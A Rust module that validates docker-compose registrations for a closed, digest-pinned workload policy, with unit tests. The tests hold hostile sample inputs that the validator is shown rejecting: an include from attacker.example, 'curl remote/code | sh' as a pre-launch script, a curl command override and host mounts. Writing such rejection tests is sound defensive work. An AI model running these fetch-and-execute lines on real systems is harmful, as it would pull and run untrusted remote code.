use std::fmt;
use std::str::FromStr;

use serde::{Deserialize, Deserializer, Serialize, Serializer};
use serde_json::Value;
use sha2::{Digest, Sha256};
use yaml_rust2::{Yaml, YamlLoader};

use crate::AppId;

#[derive(Clone, Copy, PartialEq, Eq, Hash)]
pub struct ComposeHash([u8; 32]);

impl ComposeHash {
    pub fn as_bytes(&self) -> &[u8; 32] {
        &self.0
    }
}

impl fmt::Display for ComposeHash {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("sha256:")?;
        self.0.iter().try_for_each(|b| write!(f, "{b:02x}"))
    }
}

impl fmt::Debug for ComposeHash {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        fmt::Display::fmt(self, f)
    }
}

impl From<[u8; 32]> for ComposeHash {
    fn from(bytes: [u8; 32]) -> Self {
        Self(bytes)
    }
}

#[derive(Debug, thiserror::Error)]
#[error("expected sha256:<64 lowercase hex>")]
pub struct ParseComposeHashError;

impl FromStr for ComposeHash {
    type Err = ParseComposeHashError;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        s.strip_prefix("sha256:")
            .and_then(hex_bytes)
            .map(Self)
            .ok_or(ParseComposeHashError)
    }
}

/// Exactly `2 * N` lowercase hex digits; `from_str_radix` alone would take uppercase and `+`.
pub fn hex_bytes<const N: usize>(hex: &str) -> Option<[u8; N]> {
    if hex.len() != N.checked_mul(2)?
        || !hex.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
    {
        return None;
    }
    let mut out = [0u8; N];
    for (byte, pair) in out.iter_mut().zip(hex.as_bytes().chunks_exact(2)) {
        *byte = u8::from_str_radix(std::str::from_utf8(pair).ok()?, 16).ok()?;
    }
    Some(out)
}

impl Serialize for ComposeHash {
    fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.collect_str(self)
    }
}

impl<'de> Deserialize<'de> for ComposeHash {
    fn deserialize<D: Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let s = String::deserialize(deserializer)?;
        s.parse().map_err(serde::de::Error::custom)
    }
}

pub fn compose_hash(compose: &str) -> ComposeHash {
    ComposeHash(Sha256::digest(compose).into())
}

/// All variants are the `malformed` error of the registration route.
#[derive(Debug, thiserror::Error)]
pub enum RegistrationError {
    #[error("compose is not valid JSON: {0}")]
    Json(#[from] serde_json::Error),
    #[error("compose is not a JSON object")]
    NotObject,
    #[error("compose name {name:?} is not the app_id {app_id}")]
    NameMismatch { name: String, app_id: AppId },
    #[error("docker_compose_file is missing or not a string")]
    NoDockerComposeFile,
    #[error("docker_compose_file is not YAML: {0}")]
    Yaml(#[from] yaml_rust2::ScanError),
    #[error("image {0:?} carries no @sha256:<64 hex> digest")]
    ImageWithoutDigest(String),
    #[error("a build: key is present; every service must resolve to a pinned image")]
    BuildNotAllowed,
    #[error("closed workload policy: {0}")]
    OpenWorkload(String),
}

impl RegistrationError {
    pub fn code(&self) -> &'static str {
        "malformed"
    }
}

pub fn check_registration(compose: &str, app_id: AppId) -> Result<ComposeHash, RegistrationError> {
    let value: Value = serde_json::from_str(compose)?;
    let object = value.as_object().ok_or(RegistrationError::NotObject)?;
    let name = object
        .get("name")
        .and_then(Value::as_str)
        .unwrap_or_default();
    if name != app_id.to_string() {
        return Err(RegistrationError::NameMismatch {
            name: name.to_owned(),
            app_id,
        });
    }
    let yaml = object
        .get("docker_compose_file")
        .and_then(Value::as_str)
        .ok_or(RegistrationError::NoDockerComposeFile)?;
    let documents = YamlLoader::load_from_str(yaml)?;
    documents.iter().try_for_each(check_images)?;
    check_closed_workload(object, &documents)?;
    Ok(compose_hash(compose))
}

fn closed_error(message: &str) -> RegistrationError {
    RegistrationError::OpenWorkload(message.into())
}

/// Initial CPU profile: executable bytes come only from digest-pinned images.
/// New Compose capabilities must be explicitly qualified before adding them.
fn check_closed_workload(
    envelope: &serde_json::Map<String, Value>,
    documents: &[Yaml],
) -> Result<(), RegistrationError> {
    if envelope.keys().any(|key| {
        !matches!(
            key.as_str(),
            "allowed_envs"
                | "docker_compose_file"
                | "features"
                | "gateway_enabled"
                | "kms_enabled"
                | "local_key_provider_enabled"
                | "manifest_version"
                | "name"
                | "no_instance_id"
                | "pre_launch_script"
                | "public_logs"
                | "public_sysinfo"
                | "public_tcbinfo"
                | "runner"
                | "secure_time"
                | "storage_fs"
                | "tproxy_enabled"
        )
    }) {
        return Err(closed_error(
            "unknown envelope fields require qualification",
        ));
    }
    if envelope.get("runner").and_then(Value::as_str) != Some("docker-compose") {
        return Err(closed_error("docker-compose runner required"));
    }
    if envelope
        .get("pre_launch_script")
        .and_then(Value::as_str)
        .is_some_and(|s| s != ":\n")
    {
        return Err(closed_error("custom pre-launch scripts are disabled"));
    }
    let [Yaml::Hash(root)] = documents else {
        return Err(closed_error("exactly one Compose mapping required"));
    };
    if root
        .keys()
        .any(|k| !matches!(k.as_str(), Some("services" | "volumes")))
    {
        return Err(closed_error(
            "external resolution and unknown top-level fields are disabled",
        ));
    }
    let services = root
        .get(&Yaml::String("services".into()))
        .and_then(Yaml::as_hash)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| closed_error("nonempty services required"))?;
    if let Some(volumes) = root.get(&Yaml::String("volumes".into())) {
        let volumes = volumes
            .as_hash()
            .ok_or_else(|| closed_error("volumes must be a mapping"))?;
        for (name, value) in volumes {
            if name.as_str() != Some("alpha-run") || !value.as_hash().is_some_and(|m| m.is_empty())
            {
                return Err(closed_error(
                    "only the private alpha-run runtime socket volume is allowed",
                ));
            }
        }
    }
    for (name, service) in services {
        let service = service
            .as_hash()
            .ok_or_else(|| closed_error("service mapping required"))?;
        let image = service
            .get(&Yaml::String("image".into()))
            .and_then(Yaml::as_str)
            .ok_or_else(|| closed_error("every service requires a literal pinned image"))?;
        if !has_sha256_digest(image) || image.contains('$') {
            return Err(closed_error("literal pinned image required"));
        }
        for (field, value) in service {
            match field.as_str() {
                Some("image" | "ports" | "restart") => reject_interpolation(value)?,
                Some("environment") => {
                    let env = value
                        .as_hash()
                        .ok_or_else(|| closed_error("literal environment mapping required"))?;
                    for (key, value) in env {
                        let key = key
                            .as_str()
                            .ok_or_else(|| closed_error("environment name required"))?;
                        let operational = name.as_str() == Some("alpha-kms")
                            && matches!(
                                key,
                                "ALPHACOMPUTE_DATABASE_URL"
                                    | "ALPHACOMPUTE_KMS_ENDPOINTS"
                                    | "ALPHACOMPUTE_PCCS_URL"
                                    | "ALPHACOMPUTE_PLATFORM_DOCUMENT_URL"
                                    | "ALPHACOMPUTE_DATABASE_INTEGRITY"
                                    | "ALPHACOMPUTE_KMS_DEV_ROOT_KEK"
                            )
                            || name.as_str() == Some("alpha-runtime")
                                && key == "ALPHACOMPUTE_KMS_ENDPOINTS";
                        if !operational || value.as_str() != Some(format!("${{{key}}}").as_str()) {
                            reject_interpolation(value)?;
                        }
                    }
                }
                Some("volumes") => {
                    let mounts = value
                        .as_vec()
                        .ok_or_else(|| closed_error("literal mount list required"))?;
                    for mount in mounts {
                        let runtime = matches!(name.as_str(), Some("alpha-runtime" | "alpha-kms"));
                        let allowed = mount.as_str() == Some("alpha-run:/run/alpha")
                            || runtime
                                && matches!(
                                    mount.as_str(),
                                    Some(
                                        "/var/run/dstack.sock:/var/run/dstack.sock"
                                            | "/run/log/dstack:/run/log/dstack:ro"
                                            | "/sys/firmware/acpi/tables/data/CCEL:/ccel:ro"
                                    )
                                );
                        if !allowed {
                            return Err(closed_error(
                                "mutable executable mounts and host sockets are disabled",
                            ));
                        }
                    }
                }
                _ => {
                    return Err(closed_error(
                        "unknown service fields, build, include, extends, commands and entrypoint overrides are disabled",
                    ));
                }
            }
        }
    }
    Ok(())
}

fn reject_interpolation(value: &Yaml) -> Result<(), RegistrationError> {
    match value {
        Yaml::String(s) if s.contains('$') => Err(closed_error(
            "environment interpolation is disabled for workload inputs",
        )),
        Yaml::Array(items) => items.iter().try_for_each(reject_interpolation),
        Yaml::Hash(_) | Yaml::Alias(_) => Err(closed_error(
            "structured or aliased executable inputs are disabled",
        )),
        _ => Ok(()),
    }
}

fn check_images(node: &Yaml) -> Result<(), RegistrationError> {
    match node {
        Yaml::Hash(map) => map.iter().try_for_each(|(key, value)| {
            if key.as_str() == Some("build") {
                return Err(RegistrationError::BuildNotAllowed);
            }
            if key.as_str() == Some("image") {
                let image = value.as_str().unwrap_or_default();
                if !has_sha256_digest(image) {
                    return Err(RegistrationError::ImageWithoutDigest(image.to_owned()));
                }
            }
            check_images(value)
        }),
        Yaml::Array(items) => items.iter().try_for_each(check_images),
        _ => Ok(()),
    }
}

fn has_sha256_digest(image: &str) -> bool {
    image
        .rsplit_once("@sha256:")
        .is_some_and(|(repository, hex)| {
            !repository.is_empty() && !repository.contains('$') && hex_bytes::<32>(hex).is_some()
        })
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;

    use serde_json::json;

    use super::*;
    use crate::signing::{context, signing_digest};

    fn read(dir: &str, file: &str) -> String {
        let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../testdata/manifest");
        fs::read_to_string(root.join(dir).join(file)).unwrap()
    }

    fn hex(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    #[test]
    fn approval_closes_external_and_mutable_workload_dependencies() {
        let approved = read("05-deploy", "app-compose.json");
        let base: Value = serde_json::from_str(&approved).unwrap();
        let app_id: AppId = base["name"].as_str().unwrap().parse().unwrap();
        assert!(check_registration(&approved, app_id).is_ok());
        let image = format!("repo@sha256:{}", "a".repeat(64));
        for yaml in [
            "include: https://attacker.example/compose.yaml".to_owned(),
            format!(
                "services:\n  app:\n    image: {image}\n    extends: {{file: remote.yaml, service: app}}\n"
            ),
            format!("services:\n  app:\n    image: {image}\n    env_file: /host/env\n"),
            format!("services:\n  app:\n    image: {image}\n    volumes: [/host:/code]\n"),
            format!("services:\n  app:\n    image: {image}\n    command: curl remote/code\n"),
            format!(
                "services:\n  app:\n    image: {image}\n    environment: {{CODE: '${{REMOTE}}'}}\n"
            ),
            format!("services:\n  app:\n    image: {image}\n---\nservices: {{}}\n"),
        ] {
            let mut bad = base.clone();
            bad["docker_compose_file"] = Value::String(yaml);
            assert!(check_registration(&serde_json::to_string(&bad).unwrap(), app_id).is_err());
        }
        for (key, value) in [
            ("pre_launch_script", json!("curl remote/code | sh")),
            ("unknown_loader", json!("remote/code")),
        ] {
            let mut bad = base.clone();
            bad[key] = value;
            assert!(check_registration(&serde_json::to_string(&bad).unwrap(), app_id).is_err());
        }
    }

    #[test]
    fn registration_vector() {
        let expected: Value = serde_json::from_str(&read("01-canonical", "expected.json")).unwrap();
        let app_id: AppId = expected["app_id"].as_str().unwrap().parse().unwrap();
        let compose = read("01-canonical", "app-compose.json");

        assert!(
            check_registration(&compose, app_id).is_err(),
            "historical open profile is no longer admitted"
        );
        let hash = compose_hash(&compose);
        assert_eq!(hash.to_string(), expected["compose_hash"]);
        assert_eq!(hash, compose_hash(&compose));

        let document = json!({"app_id": app_id, "compose": compose});
        assert_eq!(expected["signing_context"], context::REVISION);
        let digest = signing_digest(context::REVISION, &document).unwrap();
        assert_eq!(
            format!("sha256:{}", hex(&digest)),
            expected["signing_digest"]
        );
    }

    #[test]
    fn compose_hash_round_trips_through_text_and_json() {
        let hash = compose_hash("{}");
        assert_eq!(hash.to_string().parse::<ComposeHash>().unwrap(), hash);
        let json = serde_json::to_string(&hash).unwrap();
        assert_eq!(json, format!("\"{hash}\""));
        assert_eq!(serde_json::from_str::<ComposeHash>(&json).unwrap(), hash);
        for bad in ["", "sha256:", "sha256:zz", &hash.to_string().to_uppercase()] {
            assert!(bad.parse::<ComposeHash>().is_err(), "{bad}");
        }
    }

    #[test]
    fn form_of_the_bytes_is_the_providers_business() {
        let app_id: AppId = "01994b3e-5c8a-7d3e-9a1b-2c3d4e5f6a7b".parse().unwrap();
        let canonical = read("01-canonical", "app-compose.json");
        let with_newline = read("04-trailing-newline", "input.json");
        let hash = compose_hash(&with_newline);
        assert_ne!(hash, compose_hash(&canonical));
        assert!(check_registration(&read("01-canonical", "input.json"), app_id).is_err());
    }

    #[test]
    fn reject_vectors() {
        for dir in ["02-reject-image-tag", "03-reject-name"] {
            let expected: Value = serde_json::from_str(&read(dir, "expected.json")).unwrap();
            let app_id: AppId = expected["app_id"].as_str().unwrap().parse().unwrap();
            let err = check_registration(&read(dir, "app-compose.json"), app_id).unwrap_err();
            let kind = match err {
                RegistrationError::NameMismatch { .. } => "name_mismatch",
                RegistrationError::ImageWithoutDigest(_) => "image_without_digest",
                other => panic!("{dir}: unexpected {other}"),
            };
            assert_eq!(kind, expected["error"], "{dir}");
            assert_eq!(err.code(), "malformed");
        }
    }

    #[test]
    fn images_are_found_anywhere_in_the_yaml() {
        let ok = "@sha256:".to_owned() + &"0".repeat(64);
        let merged = format!("x-base: &b\n  image: a{ok}\nservices:\n  app:\n    <<: *b\n");
        assert!(check_images(&YamlLoader::load_from_str(&merged).unwrap()[0]).is_ok());
        let upper = format!(
            "services:\n  app:\n    image: a@sha256:{}\n",
            "A".repeat(64)
        );
        let built =
            format!("services:\n  app:\n    image: a{ok}\n    build: https://x/y.git#main\n");
        assert!(matches!(
            check_images(&YamlLoader::load_from_str(&built).unwrap()[0]),
            Err(RegistrationError::BuildNotAllowed)
        ));
        for bad in [
            "services: {app: {image: a:latest}}",
            "x-base:\n  image: a@sha256:abc\n",
            "services:\n  app:\n    image: [a]\n",
            &upper,
        ] {
            let doc = &YamlLoader::load_from_str(bad).unwrap()[0];
            assert!(
                matches!(
                    check_images(doc),
                    Err(RegistrationError::ImageWithoutDigest(_))
                ),
                "{bad}"
            );
        }
    }
}
